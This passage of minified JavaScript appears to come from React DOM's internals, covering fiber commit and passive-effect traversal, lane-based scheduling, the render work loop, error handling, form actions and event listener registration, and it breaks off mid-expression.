26:case 5:uo(i,i.return),Mr(i);break;case 22:i.memoizedState===null&&Mr(i);break;case 30:Mr(i);break;default:Mr(i)}n=n.sibling}}function zo(n,i,s){for(s=s&&(i.subtreeFlags&8772)!==0,i=i.child;i!==null;){var u=i.alternate,h=n,b=i,C=b.flags;switch(b.tag){case 0:case 11:case 15:zo(h,b,s),oc(4,b);break;case 1:if(zo(h,b,s),u=b,h=u.stateNode,typeof h.componentDidMount=="function")try{h.componentDidMount()}catch(X){ga(u,u.return,X)}if(u=b,h=u.updateQueue,h!==null){var P=u.stateNode;try{var V=h.shared.hiddenCallbacks;if(V!==null)for(h.shared.hiddenCallbacks=null,h=0;h<V.length;h++)vy(V[h],P)}catch(X){ga(u,u.return,X)}}s&&C&64&&RE(b),ic(b,b.return);break;case 27:wE(b);case 26:case 5:zo(h,b,s),s&&u===null&&C&4&&IE(b),ic(b,b.return);break;case 12:zo(h,b,s);break;case 31:zo(h,b,s),s&&C&4&&OE(h,b);break;case 13:zo(h,b,s),s&&C&4&&zE(h,b);break;case 22:b.memoizedState===null&&zo(h,b,s),ic(b,b.return);break;case 30:break;default:zo(h,b,s)}i=i.sibling}}function Of(n,i){var s=null;n!==null&&n.memoizedState!==null&&n.memoizedState.cachePool!==null&&(s=n.memoizedState.cachePool.pool),n=null,i.memoizedState!==null&&i.memoizedState.cachePool!==null&&(n=i.memoizedState.cachePool.pool),n!==s&&(n!=null&&n.refCount++,s!=null&&Gl(s))}function zf(n,i){n=null,i.alternate!==null&&(n=i.alternate.memoizedState.cache),i=i.memoizedState.cache,i!==n&&(i.refCount++,n!=null&&Gl(n))}function Dn(n,i,s,u){if(i.subtreeFlags&10256)for(i=i.child;i!==null;)VE(n,i,s,u),i=i.sibling}function VE(n,i,s,u){var h=i.flags;switch(i.tag){case 0:case 11:case 15:Dn(n,i,s,u),h&2048&&oc(9,i);break;case 1:Dn(n,i,s,u);break;case 3:Dn(n,i,s,u),h&2048&&(n=null,i.alternate!==null&&(n=i.alternate.memoizedState.cache),i=i.memoizedState.cache,i!==n&&(i.refCount++,n!=null&&Gl(n)));break;case 12:if(h&2048){Dn(n,i,s,u),n=i.stateNode;try{var b=i.memoizedProps,C=b.id,P=b.onPostCommit;typeof P=="function"&&P(C,i.alternate===null?"mount":"update",n.passiveEffectDuration,-0)}catch(V){ga(i,i.return,V)}}else Dn(n,i,s,u);break;case 31:Dn(n,i,s,u);break;case 13:Dn(n,i,s,u);break;case 23:break;case 22:b=i.stateNode,C=i.alternate,i.memoizedState!==null?b._visibility&2?Dn(n,i,s,u):rc(n,i):b._visibility&2?Dn(n,i,s,u):(b._visibility|=2,Ls(n,i,s,u,(i.subtreeFlags&10256)!==0||!1)),h&2048&&Of(C,i);break;case 24:Dn(n,i,s,u),h&2048&&zf(i.alternate,i);break;default:Dn(n,i,s,u)}}function Ls(n,i,s,u,h){for(h=h&&((i.subtreeFlags&10256)!==0||!1),i=i.child;i!==null;){var b=n,C=i,P=s,V=u,X=C.flags;switch(C.tag){case 0:case 11:case 15:Ls(b,C,P,V,h),oc(8,C);break;case 23:break;case 22:var ie=C.stateNode;C.memoizedState!==null?ie._visibility&2?Ls(b,C,P,V,h):rc(b,C):(ie._visibility|=2,Ls(b,C,P,V,h)),h&&X&2048&&Of(C.alternate,C);break;case 24:Ls(b,C,P,V,h),h&&X&2048&&zf(C.alternate,C);break;default:Ls(b,C,P,V,h)}i=i.sibling}}function rc(n,i){if(i.subtreeFlags&10256)for(i=i.child;i!==null;){var s=n,u=i,h=u.flags;switch(u.tag){case 22:rc(s,u),h&2048&&Of(u.alternate,u);break;case 24:rc(s,u),h&2048&&zf(u.alternate,u);break;default:rc(s,u)}i=i.sibling}}var sc=8192;function Is(n,i,s){if(n.subtreeFlags&sc)for(n=n.child;n!==null;)FE(n,i,s),n=n.sibling}function FE(n,i,s){switch(n.tag){case 26:Is(n,i,s),n.flags&sc&&n.memoizedState!==null&&Dq(s,In,n.memoizedState,n.memoizedProps);break;case 5:Is(n,i,s);break;case 3:case 4:var u=In;In=kd(n.stateNode.containerInfo),Is(n,i,s),In=u;break;case 22:n.memoizedState===null&&(u=n.alternate,u!==null&&u.memoizedState!==null?(u=sc,sc=16777216,Is(n,i,s),sc=u):Is(n,i,s));break;default:Is(n,i,s)}}function HE(n){var i=n.alternate;if(i!==null&&(n=i.child,n!==null)){i.child=null;do i=n.sibling,n.sibling=null,n=i;while(n!==null)}}function lc(n){var i=n.deletions;if((n.flags&16)!==0){if(i!==null)for(var s=0;s<i.length;s++){var u=i[s];ot=u,JE(u,n)}HE(n)}if(n.subtreeFlags&10256)for(n=n.child;n!==null;)GE(n),n=n.sibling}function GE(n){switch(n.tag){case 0:case 11:case 15:lc(n),n.flags&2048&&Ti(9,n,n.return);break;case 3:lc(n);break;case 12:lc(n);break;case 22:var i=n.stateNode;n.memoizedState!==null&&i._visibility&2&&(n.return===null||n.return.tag!==13)?(i._visibility&=-3,Ad(n)):lc(n);break;default:lc(n)}}function Ad(n){var i=n.deletions;if((n.flags&16)!==0){if(i!==null)for(var s=0;s<i.length;s++){var u=i[s];ot=u,JE(u,n)}HE(n)}for(n=n.child;n!==null;){switch(i=n,i.tag){case 0:case 11:case 15:Ti(8,i,i.return),Ad(i);break;case 22:s=i.stateNode,s._visibility&2&&(s._visibility&=-3,Ad(i));break;default:Ad(i)}n=n.sibling}}function JE(n,i){for(;ot!==null;){var s=ot;switch(s.tag){case 0:case 11:case 15:Ti(8,s,i);break;case 23:case 22:if(s.memoizedState!==null&&s.memoizedState.cachePool!==null){var u=s.memoizedState.cachePool.pool;u!=null&&u.refCount++}break;case 24:Gl(s.memoizedState.cache)}if(u=s.child,u!==null)u.return=s,ot=u;else e:for(s=n;ot!==null;){u=ot;var h=u.sibling,b=u.return;if(kE(u),u===s){ot=null;break e}if(h!==null){h.return=b,ot=h;break e}ot=b}}}var QP={getCacheForType:function(n){var i=lt(Ga),s=i.data.get(n);return s===void 0&&(s=n(),i.data.set(n,s)),s},cacheSignal:function(){return lt(Ga).controller.signal}},WP=typeof WeakMap=="function"?WeakMap:Map,da=0,Sa=null,Ge=null,We=0,ha=0,Qt=null,xi=!1,Ds=!1,Uf=!1,Uo=0,_a=0,ji=0,_r=0,Bf=0,Wt=0,ws=0,cc=null,wt=null,Vf=!1,Td=0,QE=0,xd=1/0,jd=null,Pi=null,Xa=0,qi=null,Ms=null,Bo=0,Ff=0,Hf=null,WE=null,uc=0,Gf=null;function Kt(){return(da&2)!==0&&We!==0?We&-We:K.T!==null?Yf():Pu()}function KE(){if(Wt===0)if((We&536870912)===0||aa){var n=lr;lr<<=1,(lr&3932160)===0&&(lr=262144),Wt=n}else Wt=536870912;return n=Gt.current,n!==null&&(n.flags|=32),Wt}function Mt(n,i,s){(n===Sa&&(ha===2||ha===9)||n.cancelPendingCommit!==null)&&(_s(n,0),Ri(n,We,Wt,!1)),cr(n,s),((da&2)===0||n!==Sa)&&(n===Sa&&((da&2)===0&&(_r|=s),_a===4&&Ri(n,We,Wt,!1)),po(n))}function $E(n,i,s){if((da&6)!==0)throw Error(o(327));var u=!s&&(i&127)===0&&(i&n.expiredLanes)===0||Cn(n,i),h=u?YP(n,i):Qf(n,i,!0),b=u;do{if(h===0){Ds&&!u&&Ri(n,i,0,!1);break}else{if(s=n.current.alternate,b&&!KP(s)){h=Qf(n,i,!1),b=!1;continue}if(h===2){if(b=i,n.errorRecoveryDisabledLanes&b)var C=0;else C=n.pendingLanes&-536870913,C=C!==0?C:C&536870912?536870912:0;if(C!==0){i=C;e:{var P=n;h=cc;var V=P.current.memoizedState.isDehydrated;if(V&&(_s(P,C).flags|=256),C=Qf(P,C,!1),C!==2){if(Uf&&!V){P.errorRecoveryDisabledLanes|=b,_r|=b,h=4;break e}b=wt,wt=h,b!==null&&(wt===null?wt=b:wt.push.apply(wt,b))}h=C}if(b=!1,h!==2)continue}}if(h===1){_s(n,0),Ri(n,i,0,!0);break}e:{switch(u=n,b=h,b){case 0:case 1:throw Error(o(345));case 4:if((i&4194048)!==i)break;case 6:Ri(u,i,Wt,!xi);break e;case 2:wt=null;break;case 3:case 5:break;default:throw Error(o(329))}if((i&62914560)===i&&(h=Td+300-Ua(),10<h)){if(Ri(u,i,Wt,!xi),Qn(u,0,!0)!==0)break e;Bo=i,u.timeoutHandle=PS(YE.bind(null,u,s,wt,jd,Vf,i,Wt,_r,ws,xi,b,"Throttled",-0,0),h);break e}YE(u,s,wt,jd,Vf,i,Wt,_r,ws,xi,b,null,-0,0)}}break}while(!0);po(n)}function YE(n,i,s,u,h,b,C,P,V,X,ie,se,ae,ne){if(n.timeoutHandle=-1,se=i.subtreeFlags,se&8192||(se&16785408)===16785408){se={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:xn},FE(i,b,se);var Ce=(b&62914560)===b?Td-Ua():(b&4194048)===b?QE-Ua():0;if(Ce=wq(se,Ce),Ce!==null){Bo=b,n.cancelPendingCommit=Ce(iS.bind(null,n,i,b,s,u,h,C,P,V,ie,se,null,ae,ne)),Ri(n,b,C,!X);return}}iS(n,i,b,s,u,h,C,P,V)}function KP(n){for(var i=n;;){var s=i.tag;if((s===0||s===11||s===15)&&i.flags&16384&&(s=i.updateQueue,s!==null&&(s=s.stores,s!==null)))for(var u=0;u<s.length;u++){var h=s[u],b=h.getSnapshot;h=h.value;try{if(!Ft(b(),h))return!1}catch{return!1}}if(s=i.child,i.subtreeFlags&16384&&s!==null)s.return=i,i=s;else{if(i===n)break;for(;i.sibling===null;){if(i.return===null||i.return===n)return!0;i=i.return}i.sibling.return=i.return,i=i.sibling}}return!0}function Ri(n,i,s,u){i&=~Bf,i&=~_r,n.suspendedLanes|=i,n.pingedLanes&=~i,u&&(n.warmLanes|=i),u=n.expirationTimes;for(var h=i;0<h;){var b=31-He(h),C=1<<b;u[b]=-1,h&=~C}s!==0&&ur(n,s,i)}function Pd(){return(da&6)===0?(dc(0),!1):!0}function Jf(){if(Ge!==null){if(ha===0)var n=Ge.return;else n=Ge,Lo=jr=null,lf(n),xs=null,Ql=0,n=Ge;for(;n!==null;)qE(n.alternate,n),n=n.return;Ge=null}}function _s(n,i){var s=n.timeoutHandle;s!==-1&&(n.timeoutHandle=-1,hq(s)),s=n.cancelPendingCommit,s!==null&&(n.cancelPendingCommit=null,s()),Bo=0,Jf(),Sa=n,Ge=s=qo(n.current,null),We=i,ha=0,Qt=null,xi=!1,Ds=Cn(n,i),Uf=!1,ws=Wt=Bf=_r=ji=_a=0,wt=cc=null,Vf=!1,(i&8)!==0&&(i|=i&32);var u=n.entangledLanes;if(u!==0)for(n=n.entanglements,u&=i;0<u;){var h=31-He(u),b=1<<h;i|=n[h],u&=~b}return Uo=i,Wu(),s}function XE(n,i){Ue=null,K.H=ac,i===Ts||i===td?(i=fy(),ha=3):i===Km?(i=fy(),ha=4):ha=i===Tf?8:i!==null&&typeof i=="object"&&typeof i.then=="function"?6:1,Qt=i,Ge===null&&(_a=1,gd(n,un(i,n.current)))}function ZE(){var n=Gt.current;return n===null?!0:(We&4194048)===We?fn===null:(We&62914560)===We||(We&536870912)!==0?n===fn:!1}function eS(){var n=K.H;return K.H=ac,n===null?ac:n}function aS(){var n=K.A;return K.A=QP,n}function qd(){_a=4,xi||(We&4194048)!==We&&Gt.current!==null||(Ds=!0),(ji&134217727)===0&&(_r&134217727)===0||Sa===null||Ri(Sa,We,Wt,!1)}function Qf(n,i,s){var u=da;da|=2;var h=eS(),b=aS();(Sa!==n||We!==i)&&(jd=null,_s(n,i)),i=!1;var C=_a;e:do try{if(ha!==0&&Ge!==null){var P=Ge,V=Qt;switch(ha){case 8:Jf(),C=6;break e;case 3:case 2:case 9:case 6:Gt.current===null&&(i=!0);var X=ha;if(ha=0,Qt=null,ks(n,P,V,X),s&&Ds){C=0;break e}break;default:X=ha,ha=0,Qt=null,ks(n,P,V,X)}}$P(),C=_a;break}catch(ie){XE(n,ie)}while(!0);return i&&n.shellSuspendCounter++,Lo=jr=null,da=u,K.H=h,K.A=b,Ge===null&&(Sa=null,We=0,Wu()),C}function $P(){for(;Ge!==null;)tS(Ge)}function YP(n,i){var s=da;da|=2;var u=eS(),h=aS();Sa!==n||We!==i?(jd=null,xd=Ua()+500,_s(n,i)):Ds=Cn(n,i);e:do try{if(ha!==0&&Ge!==null){i=Ge;var b=Qt;a:switch(ha){case 1:ha=0,Qt=null,ks(n,i,b,1);break;case 2:case 9:if(py(b)){ha=0,Qt=null,nS(i);break}i=function(){ha!==2&&ha!==9||Sa!==n||(ha=7),po(n)},b.then(i,i);break e;case 3:ha=7;break e;case 4:ha=5;break e;case 7:py(b)?(ha=0,Qt=null,nS(i)):(ha=0,Qt=null,ks(n,i,b,7));break;case 5:var C=null;switch(Ge.tag){case 26:C=Ge.memoizedState;case 5:case 27:var P=Ge;if(C?VS(C):P.stateNode.complete){ha=0,Qt=null;var V=P.sibling;if(V!==null)Ge=V;else{var X=P.return;X!==null?(Ge=X,Rd(X)):Ge=null}break a}}ha=0,Qt=null,ks(n,i,b,5);break;case 6:ha=0,Qt=null,ks(n,i,b,6);break;case 8:Jf(),_a=6;break e;default:throw Error(o(462))}}XP();break}catch(ie){XE(n,ie)}while(!0);return Lo=jr=null,K.H=u,K.A=h,da=s,Ge!==null?0:(Sa=null,We=0,Wu(),_a)}function XP(){for(;Ge!==null&&!sr();)tS(Ge)}function tS(n){var i=jE(n.alternate,n,Uo);n.memoizedProps=n.pendingProps,i===null?Rd(n):Ge=i}function nS(n){var i=n,s=i.alternate;switch(i.tag){case 15:case 0:i=EE(s,i,i.pendingProps,i.type,void 0,We);break;case 11:i=EE(s,i,i.pendingProps,i.type.render,i.ref,We);break;case 5:lf(i);default:qE(s,i),i=Ge=ay(i,Uo),i=jE(s,i,Uo)}n.memoizedProps=n.pendingProps,i===null?Rd(n):Ge=i}function ks(n,i,s,u){Lo=jr=null,lf(i),xs=null,Ql=0;var h=i.return;try{if(UP(n,h,i,s,We)){_a=1,gd(n,un(s,n.current)),Ge=null;return}}catch(b){if(h!==null)throw Ge=h,b;_a=1,gd(n,un(s,n.current)),Ge=null;return}i.flags&32768?(aa||u===1?n=!0:Ds||(We&536870912)!==0?n=!1:(xi=n=!0,(u===2||u===9||u===3||u===6)&&(u=Gt.current,u!==null&&u.tag===13&&(u.flags|=16384))),oS(i,n)):Rd(i)}function Rd(n){var i=n;do{if((i.flags&32768)!==0){oS(i,xi);return}n=i.return;var s=FP(i.alternate,i,Uo);if(s!==null){Ge=s;return}if(i=i.sibling,i!==null){Ge=i;return}Ge=i=n}while(i!==null);_a===0&&(_a=5)}function oS(n,i){do{var s=HP(n.alternate,n);if(s!==null){s.flags&=32767,Ge=s;return}if(s=n.return,s!==null&&(s.flags|=32768,s.subtreeFlags=0,s.deletions=null),!i&&(n=n.sibling,n!==null)){Ge=n;return}Ge=n=s}while(n!==null);_a=6,Ge=null}function iS(n,i,s,u,h,b,C,P,V){n.cancelPendingCommit=null;do Ld();while(Xa!==0);if((da&6)!==0)throw Error(o(327));if(i!==null){if(i===n.current)throw Error(o(177));if(b=i.lanes|i.childLanes,b|=Mm,xm(n,s,b,C,P,V),n===Sa&&(Ge=Sa=null,We=0),Ms=i,qi=n,Bo=s,Ff=b,Hf=h,WE=u,(i.subtreeFlags&10256)!==0||(i.flags&10256)!==0?(n.callbackNode=null,n.callbackPriority=0,tq(fe,function(){return uS(),null})):(n.callbackNode=null,n.callbackPriority=0),u=(i.flags&13878)!==0,(i.subtreeFlags&13878)!==0||u){u=K.T,K.T=null,h=pe.p,pe.p=2,C=da,da|=4;try{GP(n,i,s)}finally{da=C,pe.p=h,K.T=u}}Xa=1,rS(),sS(),lS()}}function rS(){if(Xa===1){Xa=0;var n=qi,i=Ms,s=(i.flags&13878)!==0;if((i.subtreeFlags&13878)!==0||s){s=K.T,K.T=null;var u=pe.p;pe.p=2;var h=da;da|=4;try{UE(i,n);var b=ih,C=Jv(n.containerInfo),P=b.focusedElem,V=b.selectionRange;if(C!==P&&P&&P.ownerDocument&&Gv(P.ownerDocument.documentElement,P)){if(V!==null&&Rm(P)){var X=V.start,ie=V.end;if(ie===void 0&&(ie=X),"selectionStart"in P)P.selectionStart=X,P.selectionEnd=Math.min(ie,P.value.length);else{var se=P.ownerDocument||document,ae=se&&se.defaultView||window;if(ae.getSelection){var ne=ae.getSelection(),Ce=P.textContent.length,Ie=Math.min(V.start,Ce),Ea=V.end===void 0?Ie:Math.min(V.end,Ce);!ne.extend&&Ie>Ea&&(C=Ea,Ea=Ie,Ie=C);var W=Hv(P,Ie),J=Hv(P,Ea);if(W&&J&&(ne.rangeCount!==1||ne.anchorNode!==W.node||ne.anchorOffset!==W.offset||ne.focusNode!==J.node||ne.focusOffset!==J.offset)){var Y=se.createRange();Y.setStart(W.node,W.offset),ne.removeAllRanges(),Ie>Ea?(ne.addRange(Y),ne.extend(J.node,J.offset)):(Y.setEnd(J.node,J.offset),ne.addRange(Y))}}}}for(se=[],ne=P;ne=ne.parentNode;)ne.nodeType===1&&se.push({element:ne,left:ne.scrollLeft,top:ne.scrollTop});for(typeof P.focus=="function"&&P.focus(),P=0;P<se.length;P++){var re=se[P];re.element.scrollLeft=re.left,re.element.scrollTop=re.top}}Vd=!!oh,ih=oh=null}finally{da=h,pe.p=u,K.T=s}}n.current=i,Xa=2}}function sS(){if(Xa===2){Xa=0;var n=qi,i=Ms,s=(i.flags&8772)!==0;if((i.subtreeFlags&8772)!==0||s){s=K.T,K.T=null;var u=pe.p;pe.p=2;var h=da;da|=4;try{_E(n,i.alternate,i)}finally{da=h,pe.p=u,K.T=s}}Xa=3}}function lS(){if(Xa===4||Xa===3){Xa=0,ii();var n=qi,i=Ms,s=Bo,u=WE;(i.subtreeFlags&10256)!==0||(i.flags&10256)!==0?Xa=5:(Xa=0,Ms=qi=null,cS(n,n.pendingLanes));var h=n.pendingLanes;if(h===0&&(Pi=null),To(s),i=i.stateNode,ra&&typeof ra.onCommitFiberRoot=="function")try{ra.onCommitFiberRoot(ea,i,void 0,(i.current.flags&128)===128)}catch{}if(u!==null){i=K.T,h=pe.p,pe.p=2,K.T=null;try{for(var b=n.onRecoverableError,C=0;C<u.length;C++){var P=u[C];b(P.value,{componentStack:P.stack})}}finally{K.T=i,pe.p=h}}(Bo&3)!==0&&Ld(),po(n),h=n.pendingLanes,(s&261930)!==0&&(h&42)!==0?n===Gf?uc++:(uc=0,Gf=n):uc=0,dc(0)}}function cS(n,i){(n.pooledCacheLanes&=i)===0&&(i=n.pooledCache,i!=null&&(n.pooledCache=null,Gl(i)))}function Ld(){return rS(),sS(),lS(),uS()}function uS(){if(Xa!==5)return!1;var n=qi,i=Ff;Ff=0;var s=To(Bo),u=K.T,h=pe.p;try{pe.p=32>s?32:s,K.T=null,s=Hf,Hf=null;var b=qi,C=Bo;if(Xa=0,Ms=qi=null,Bo=0,(da&6)!==0)throw Error(o(331));var P=da;if(da|=4,GE(b.current),VE(b,b.current,C,s),da=P,dc(0,!1),ra&&typeof ra.onPostCommitFiberRoot=="function")try{ra.onPostCommitFiberRoot(ea,b)}catch{}return!0}finally{pe.p=h,K.T=u,cS(n,i)}}function dS(n,i,s){i=un(s,i),i=Af(n.stateNode,i,2),n=Si(n,i,2),n!==null&&(cr(n,2),po(n))}function ga(n,i,s){if(n.tag===3)dS(n,n,s);else for(;i!==null;){if(i.tag===3){dS(i,n,s);break}else if(i.tag===1){var u=i.stateNode;if(typeof i.type.getDerivedStateFromError=="function"||typeof u.componentDidCatch=="function"&&(Pi===null||!Pi.has(u))){n=un(s,n),s=pE(2),u=Si(i,s,2),u!==null&&(mE(s,u,i,n),cr(u,2),po(u));break}}i=i.return}}function Wf(n,i,s){var u=n.pingCache;if(u===null){u=n.pingCache=new WP;var h=new Set;u.set(i,h)}else h=u.get(i),h===void 0&&(h=new Set,u.set(i,h));h.has(s)||(Uf=!0,h.add(s),n=ZP.bind(null,n,i,s),i.then(n,n))}function ZP(n,i,s){var u=n.pingCache;u!==null&&u.delete(i),n.pingedLanes|=n.suspendedLanes&s,n.warmLanes&=~s,Sa===n&&(We&s)===s&&(_a===4||_a===3&&(We&62914560)===We&&300>Ua()-Td?(da&2)===0&&_s(n,0):Bf|=s,ws===We&&(ws=0)),po(n)}function pS(n,i){i===0&&(i=ju()),n=Ar(n,i),n!==null&&(cr(n,i),po(n))}function eq(n){var i=n.memoizedState,s=0;i!==null&&(s=i.retryLane),pS(n,s)}function aq(n,i){var s=0;switch(n.tag){case 31:case 13:var u=n.stateNode,h=n.memoizedState;h!==null&&(s=h.retryLane);break;case 19:u=n.stateNode;break;case 22:u=n.stateNode._retryCache;break;default:throw Error(o(314))}u!==null&&u.delete(i),pS(n,s)}function tq(n,i){return ia(n,i)}var Id=null,Ns=null,Kf=!1,Dd=!1,$f=!1,Li=0;function po(n){n!==Ns&&n.next===null&&(Ns===null?Id=Ns=n:Ns=Ns.next=n),Dd=!0,Kf||(Kf=!0,oq())}function dc(n,i){if(!$f&&Dd){$f=!0;do for(var s=!1,u=Id;u!==null;){if(n!==0){var h=u.pendingLanes;if(h===0)var b=0;else{var C=u.suspendedLanes,P=u.pingedLanes;b=(1<<31-He(42|n)+1)-1,b&=h&~(C&~P),b=b&201326741?b&201326741|1:b?b|2:0}b!==0&&(s=!0,gS(u,b))}else b=We,b=Qn(u,u===Sa?b:0,u.cancelPendingCommit!==null||u.timeoutHandle!==-1),(b&3)===0||Cn(u,b)||(s=!0,gS(u,b));u=u.next}while(s);$f=!1}}function nq(){mS()}function mS(){Dd=Kf=!1;var n=0;Li!==0&&fq()&&(n=Li);for(var i=Ua(),s=null,u=Id;u!==null;){var h=u.next,b=fS(u,i);b===0?(u.next=null,s===null?Id=h:s.next=h,h===null&&(Ns=s)):(s=u,(n!==0||(b&3)!==0)&&(Dd=!0)),u=h}Xa!==0&&Xa!==5||dc(n),Li!==0&&(Li=0)}function fS(n,i){for(var s=n.suspendedLanes,u=n.pingedLanes,h=n.expirationTimes,b=n.pendingLanes&-62914561;0<b;){var C=31-He(b),P=1<<C,V=h[C];V===-1?((P&s)===0||(P&u)!==0)&&(h[C]=Tm(P,i)):V<=i&&(n.expiredLanes|=P),b&=~P}if(i=Sa,s=We,s=Qn(n,n===i?s:0,n.cancelPendingCommit!==null||n.timeoutHandle!==-1),u=n.callbackNode,s===0||n===i&&(ha===2||ha===9)||n.cancelPendingCommit!==null)return u!==null&&u!==null&&Ut(u),n.callbackNode=null,n.callbackPriority=0;if((s&3)===0||Cn(n,s)){if(i=s&-s,i===n.callbackPriority)return i;switch(u!==null&&Ut(u),To(s)){case 2:case 8:s=Z;break;case 32:s=fe;break;case 268435456:s=Se;break;default:s=fe}return u=hS.bind(null,n),s=ia(s,u),n.callbackPriority=i,n.callbackNode=s,i}return u!==null&&u!==null&&Ut(u),n.callbackPriority=2,n.callbackNode=null,2}function hS(n,i){if(Xa!==0&&Xa!==5)return n.callbackNode=null,n.callbackPriority=0,null;var s=n.callbackNode;if(Ld()&&n.callbackNode!==s)return null;var u=We;return u=Qn(n,n===Sa?u:0,n.cancelPendingCommit!==null||n.timeoutHandle!==-1),u===0?null:($E(n,u,i),fS(n,Ua()),n.callbackNode!=null&&n.callbackNode===s?hS.bind(null,n):null)}function gS(n,i){if(Ld())return null;$E(n,i,!0)}function oq(){gq(function(){(da&6)!==0?ia(O,nq):mS()})}function Yf(){if(Li===0){var n=Cs;n===0&&(n=Gn,Gn<<=1,(Gn&261888)===0&&(Gn=256)),Li=n}return Li}function bS(n){return n==null||typeof n=="symbol"||typeof n=="boolean"?null:typeof n=="function"?n:ss(""+n)}function vS(n,i){var s=i.ownerDocument.createElement("input");return s.name=i.name,s.value=i.value,n.id&&s.setAttribute("form",n.id),i.parentNode.insertBefore(s,i),n=new FormData(n),s.parentNode.removeChild(s),n}function iq(n,i,s,u,h){if(i==="submit"&&s&&s.stateNode===h){var b=bS((h[tt]||null).action),C=u.submitter;C&&(i=(i=C[tt]||null)?bS(i.formAction):C.getAttribute("formAction"),i!==null&&(b=i,C=null));var P=new oo("action","action",null,u,h);n.push({event:P,listeners:[{instance:null,listener:function(){if(u.defaultPrevented){if(Li!==0){var V=C?vS(h,C):new FormData(h);bf(s,{pending:!0,data:V,method:h.method,action:b},null,V)}}else typeof b=="function"&&(P.preventDefault(),V=C?vS(h,C):new FormData(h),bf(s,{pending:!0,data:V,method:h.method,action:b},b,V))},currentTarget:h}]})}}for(var Xf=0;Xf<wm.length;Xf++){var Zf=wm[Xf],rq=Zf.toLowerCase(),sq=Zf[0].toUpperCase()+Zf.slice(1);Ln(rq,"on"+sq)}Ln(Kv,"onAnimationEnd"),Ln($v,"onAnimationIteration"),Ln(Yv,"onAnimationStart"),Ln("dblclick","onDoubleClick"),Ln("focusin","onFocus"),Ln("focusout","onBlur"),Ln(AP,"onTransitionRun"),Ln(TP,"onTransitionStart"),Ln(xP,"onTransitionCancel"),Ln(Xv,"onTransitionEnd"),eo("onMouseEnter",["mouseout","mouseover"]),eo("onMouseLeave",["mouseout","mouseover"]),eo("onPointerEnter",["pointerout","pointerover"]),eo("onPointerLeave",["pointerout","pointerover"]),Zn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Zn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Zn("onBeforeInput",["compositionend","keypress","textInput","paste"]),Zn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Zn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Zn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var pc="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),lq=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(pc));function yS(n,i){i=(i&4)!==0;for(var s=0;s<n.length;s++){var u=n[s],h=u.event;u=u.listeners;e:{var b=void 0;if(i)for(var C=u.length-1;0<=C;C--){var P=u[C],V=P.instance,X=P.currentTarget;if(P=P.listener,V!==b&&h.isPropagationStopped())break e;b=P,h.currentTarget=X;try{b(h)}catch(ie){Qu(ie)}h.currentTarget=null,b=V}else for(C=0;C<u.length;C++){if(P=u[C],V=P.instance,X=P.currentTarget,P=P.listener,V!==b&&h.isPropagationStopped())break e;b=P,h.currentTarget=X;try{b(h)}catch(ie){Qu(ie)}h.currentTarget=null,b=V}}}}function Je(n,i){var s=i[ts];s===void 0&&(s=i[ts]=new Set);var u=n+"__bubble";s.has(u)||(ES(i,n,2,!1),s.add(u))}function eh(n,i,s){var u=0;i&&(u|=4),ES(s,n,u,i)}var wd="_reactListening"+Math.random().toString(36).slice(2);function ah(n){if(!n[wd]){n[wd]=!0,Tl.forEach(function(s){s!=="selectionchange"&&(lq.has(s)||eh(s,!1,n),eh(s,!0,n))});var i=n.nodeType===9?n:n.ownerDocument;i===null||i[wd]||(i[wd]=!0,eh("selectionchange",!1,i))}}function ES(n,i,s,u){switch(KS(i)){case 2:var h=kq;break;case 8:h=Nq;break;default:h=gh}s=h.bind(null,i,s,n),h=void 0,!hr||i!=="touchstart"&&i!=="touchmove"&&i!=="wheel"||(h=!0),u?h!==void 0?n.addEventListener(i,s,{capture:!0,passive:h}):n.addEventListener(i,s,!0):h!==void 0?n.addEventListener(i,s,{passive:h}):n.addEventListener(i,s,!1)}function th(n,i,s,u,h){var b=u;if((i&1)===0&&(i&2)===0&&u!==null)e:for(;;){if(u===null)return;var C=u.tag;if(C===3||C===4){var P=u.stateNode.containerInfo;if(P===h)break;if(C===4)for(C=u.return;C!==null;){var V=C.tag;if((V===3||V===4)&&C.stateNode.containerInfo===h)return;C=C.return}for(;P!==null;){if(C=Yn(P),C===null)return;if(V=C.tag,V===5||V===6||V===26||V===27){u=b=C;continue e}P=P.parentNode}}u=u.return}di(function(){var X=b,ie=rn(s),se=[];e:{var ae=Zv.get(n);if(ae!==void 0){var ne=oo,Ce=n;switch(n){case"keypress":if(br(s)===0)break e;case"keydown":case"keyup":ne=Hu;break;case"focusin":Ce="focus",ne=yr;break;case"focusout":Ce="blur",ne=yr;break;case"beforeblur":case"afterblur":ne=yr;break;case"click":if(s.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":ne=Nl;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":ne=_u;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":ne=E;break;case Kv:case $v:case Yv:ne=Nu;break;case Xv:ne=q;break;case"scroll":case"scrollend":ne=kl;break;case"wheel":ne=te;break;case"copy":case"cut":case"paste":ne=Ou;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":ne=Po;break;case"toggle":case"beforetoggle":ne=ze}var Ie=(i&4)!==0,Ea=!Ie&&(n==="scroll"||n==="scrollend"),W=Ie?ae!==null?ae+"Capture":null:ae;Ie=[];for(var J=X,Y;J!==null;){var re=J;if(Y=re.stateNode,re=re.tag,re!==5&&re!==26&&re!==27||Y===null||W===null||(re=jn(J,W),re!=null&&Ie.push(mc(J,re,Y))),Ea)break;J=J.return}0<Ie.length&&(ae=new 